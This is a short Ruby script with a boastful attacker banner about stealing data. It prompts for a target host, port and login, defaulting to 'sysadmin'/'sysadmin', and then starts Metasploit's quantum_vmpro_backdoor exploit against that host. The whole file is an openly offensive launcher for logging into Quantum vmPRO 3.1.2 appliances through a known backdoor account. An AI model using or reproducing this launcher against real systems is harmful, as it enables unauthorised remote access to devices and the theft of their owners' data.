puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

	     Quantum vmPRO Backdoor Command

		       Quantum vmPRO 3.1.2
		The target ports: 
  						 SSH_PORT  22
"""

puts " [?] What is the Target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Default is 22]  "
print "[!] ---> "

port = gets.chomp

puts " [?] What is the Username? [Default is 'sysadmin']  "
print "[!] ---> "

user = gets.chomp

puts " [?] What is the Pass ? [Default is 'sysadmin']  "
print "[!] ---> "

pass = gets.chomp


exec("msfconsole -x 'use exploit/linux/ssh/quantum_vmpro_backdoor' -x 'setg RHOST #{target}' -x 'setg USER #{user}' -x 'setg PASS #{pass}' -x 'setg RPORT #{port}' -x 'run' 'run'")
